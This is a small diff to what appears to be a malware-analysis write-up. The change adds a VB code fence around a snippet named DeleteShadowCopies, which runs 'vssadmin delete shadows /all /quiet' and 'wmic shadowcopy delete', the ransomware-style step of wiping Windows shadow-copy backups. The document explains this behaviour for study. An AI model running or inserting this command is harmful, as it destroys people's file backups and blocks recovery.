@@ -25,9 +25,11 @@ Let's Dive Into It
 <details>
     <summary>Code (click to expand/collapse)</summary>
 
+```vb
 Private Shared Sub DeleteShadowCopies()
     Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete")
 End Sub
+```
 
 </details>
 
